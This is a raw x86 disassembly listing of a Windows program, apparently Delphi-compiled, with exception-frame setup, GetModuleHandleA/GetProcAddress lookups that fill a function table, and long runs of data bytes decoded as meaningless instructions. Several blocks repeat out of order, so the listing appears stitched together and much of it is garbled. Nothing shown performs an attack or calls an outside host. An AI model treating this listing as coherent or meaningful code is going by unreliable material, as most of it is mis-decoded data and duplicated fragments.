lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_40d524
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d57e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404124
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40ab90
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d585
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_40d590
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d5ea
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404124
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409370
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d5f1
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_40d5fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40d669
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404124
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_40813c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d670
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
sub_40d67c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d6dc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4092cc
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4046c8
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d6e3
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_40d6ec
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d74c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a31c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4046c8
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d753
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_40d75c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d7c0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_4081d8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_4046c8
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d7c7
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_40d7f0
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40d81c
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d38c
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3bc
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3bc
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3c8
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3c8
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3c8
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3c8
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3c8
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3c8
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3c8
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3c8
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3c8
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3d4
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3e0
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d44c
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d4b8
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d524
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d590
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d5fc
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d67c
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6ec
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d75c
mov eax r-xdata
call sub_40d7f0
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40db28
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40db4d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db54
retn
sub_40dc88
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr ah 0x1
inc eax
add [ eax + eax ] cl
jo r-xdata
popad
outsb
je r-xdata
insb
outsd
ja r-xdata
inc ebx
popad
jae r-xdata
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x70795474
outsb
jbe r-xdata
add ah bh
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ edi ] dl
jb r-xdata
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
inc ebp
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
fiadd [ eax ]
or al 0x0
add [ eax ] al
and al 0x77
inc eax
outsd
jb r-xdata
fld [ eax ]
or al 0x0
add [ eax ] al
and al 0x77
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
pop ss
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
outsd
jb r-xdata
cld
fld [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jb r-xdata
xor al 0xdd
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx * 8 + 0xc0040 ] dh
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
jns r-xdata
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
pop ss
inc ebp
push esi
popad
jb r-xdata
outsb
jbe r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
outsb
je r-xdata
sar ah 0xdd
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ eax + 0x40dd ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
fld [ eax ]
or al 0x0
add [ eax ] al
and al 0x77
jb r-xdata
popad
outsb
je r-xdata
add ah bh
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ eax ] bl
inc ebp
push esi
jb r-xdata
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
movsb [ edi ] [ esi ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
inc eax
add [ ecx + esi + 0x40 ] dl
add [ 0x72615645 ] dl
inc ecx
jb r-xdata
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
adc eax 0x72615645
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040dd ] bl
add [ eax ] al
add [ edi + esi * 2 ] ah
jb r-xdata
add [ eax ] al
and al 0x77
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xdd
inc eax
add [ eax + eax ] cl
add [ eax ] al
and al 0x77
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
push ss
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
lea eax [ eax ]
rcr ah 0x1
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
fadd [ eax ]
or al 0x0
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
fild [ eax ]
or al 0x0
add [ eax ] al
and al 0x77
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub bh bl
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
fiadd [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax - 0x5bffbfcd ] ah
xor eax [ eax ]
test al 0x33
jb r-xdata
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
sbb [ ebp + 0x56 ] al
add [ eax - 0x5bffbfcd ] ah
xor eax [ eax ]
test al 0x33
jb r-xdata
outsb
je r-xdata
popad
add [ eax ] al
and al 0x77
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
sbb [ ebp + 0x56 ] al
shr [ eax ] 0xdf
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
fild [ eax ]
or al 0x0
ja r-xdata
fiadd [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
je r-xdata
popad
inc eax
add [ eax + 0x40 ] bl
add [ eax ] al
add [ eax ] al
popad
jb r-xdata
popad
jns r-xdata
popad
jb r-xdata
cld
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ edi ] dl
dec bp
insd
outsd
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax - 0x63ffbfcd ] ch
xor eax [ eax ]
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ eax * 2 + 0x69726156 ] dl
jb r-xdata
add [ eax ] al
jb r-xdata
popad
jb r-xdata
add ah bh
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ eax ] bl
inc ebp
push esi
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ eax ] bl
inc ebp
push esi
inc eax
add ah bh
insd
jae r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
loope r-xdata
inc ebp
jb r-xdata
add [ ecx + esi + 0x40 ] dl
add [ 0x72615645 ] dl
outsb
js r-xdata
xor eax [ eax ]
jne r-xdata
jo r-xdata
popad
je r-xdata
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
adc al 0x45
push esi
popad
jb r-xdata
inc eax
add al bh
fild [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
fild [ eax ]
or al 0x0
add [ eax ] al
and al 0x77
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
outsd
jb r-xdata
jb r-xdata
inc ebp
dec ebp
in al 0x8b
mov ebx eax
popad
rcl [ ebp - 0x75 ] 0xec
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
add [ eax + eax ] cl
add [ eax ] al
and al 0x77
inc eax
add [ eax ] al
add [ eax ] al
outsd
xor eax eax
push ebp
push sub_40e223
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_412f54
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_412f54
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e22a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403ec0
retn
add esp 0xffffffe4
push ebx
je r-xdata
push 0x0
xor eax eax
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
sub cl ah
inc eax
dec edi
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ eax + 0x40df ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040df ] dl
add [ eax ] al
add [ edi + esi * 2 ] ah
je r-xdata
inc eax
add ah al
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
loopne r-xdata
outsd
jb r-xdata
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e191
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x40 ] bl
add [ eax + eax ] cl
add [ eax ] al
and al 0x77
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
sbb [ ebp + 0x56 ] al
outsd
inc ebp
push esi
popad
jb r-xdata
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
pop ss
add [ eax ] al
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
and al 0x77
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
jb r-xdata
ja r-xdata
loope r-xdata
jns r-xdata
push ebp
push sub_40e18a
push [ fs : eax ]
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
adc eax 0x72615645
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_40de99
fiadd [ eax ]
or al 0x0
add [ eax ] al
and al 0x77
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
add ah bh
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ eax ] bl
inc ebp
push esi
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
fild [ eax ]
or al 0x0
add [ eax ] al
and al 0x77
outsd
jb r-xdata
add [ eax - 0x5bffbfcd ] ah
xor eax [ eax ]
test al 0x33
jb r-xdata
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
sbb [ ebp + 0x56 ] al
add [ eax - 0x5bffbfcd ] ah
xor eax [ eax ]
test al 0x33
jb r-xdata
outsb
je r-xdata
popad
popad
outsb
je r-xdata
popad
jb r-xdata
shr [ eax ] 0xdf
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
fild [ eax ]
or al 0x0
je r-xdata
popad
inc eax
add [ eax + 0x40 ] bl
add [ eax ] al
add [ eax ] al
popad
jb r-xdata
popad
jns r-xdata
popad
jb r-xdata
cld
outsd
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
movsb [ edi ] [ esi ]
xor eax [ eax ]
test al 0x33
popad
push esi
popad
jb r-xdata
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ edi ] dl
dec bp
insd
outsd
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax - 0x63ffbfcd ] ch
xor eax [ eax ]
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ eax * 2 + 0x69726156 ] dl
jb r-xdata
add [ eax ] al
jb r-xdata
popad
jb r-xdata
add ah bh
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ eax ] bl
inc ebp
push esi
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ eax ] bl
inc ebp
push esi
inc eax
add ah bh
insd
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
jns r-xdata
jae r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
loope r-xdata
inc ebp
jb r-xdata
add [ ecx + esi + 0x40 ] dl
add [ 0x72615645 ] dl
outsb
js r-xdata
xor eax [ eax ]
jne r-xdata
jo r-xdata
popad
je r-xdata
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
adc al 0x45
push esi
popad
jb r-xdata
inc eax
add al bh
fild [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
fild [ eax ]
or al 0x0
add [ eax ] al
and al 0x77
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
outsd
jb r-xdata
jb r-xdata
inc ebp
add [ eax ] al
and al 0x77
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
sbb [ ebp + 0x56 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
dec ebp
in al 0x8b
mov ebx eax
popad
rcl [ ebp - 0x75 ] 0xec
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
add [ eax + eax ] cl
add [ eax ] al
and al 0x77
inc eax
add [ eax ] al
add [ eax ] al
outsd
xor eax eax
push ebp
push sub_40e223
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_412f54
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_412f54
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e22a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403ec0
retn
add esp 0xffffffe4
push ebx
je r-xdata
push 0x0
xor eax eax
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
sub cl ah
inc eax
dec edi
jb r-xdata
inc ebp
jb r-xdata
outsb
js r-xdata
dec ecx
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ eax + 0x40df ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040df ] dl
add [ eax ] al
add [ edi + esi * 2 ] ah
je r-xdata
inc eax
add ah al
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
loopne r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub bh bl
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
